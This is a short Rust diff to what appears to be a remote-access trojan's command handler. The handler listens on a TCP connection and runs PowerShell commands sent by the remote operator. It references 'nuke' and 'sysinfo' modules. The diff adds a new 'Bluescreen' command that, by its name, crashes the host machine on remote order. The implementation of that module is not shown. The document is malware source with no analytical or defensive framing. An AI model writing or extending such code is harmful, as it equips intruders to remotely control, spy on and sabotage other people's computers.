@@ -3,6 +3,7 @@ use tokio::io::AsyncWriteExt;
 use crate::types::Codes;
 use crate::types::Packet;
 
+mod bluescreen;
 mod nuke;
 mod powershell;
 mod sysinfo;
@@ -25,6 +26,9 @@ pub async fn handler(packet: Packet, stream: &mut tokio::net::TcpStream) {
             let command = std::str::from_utf8(&packet.buf).unwrap();
             let packet = powershell::powershell(command);
             stream.write(&packet.to_bytes()).await.ok();
+        }
+        Codes::Bluescreen => {
+            bluescreen::bluescreen();
         }
         _ => {
             std::process::exit(0);
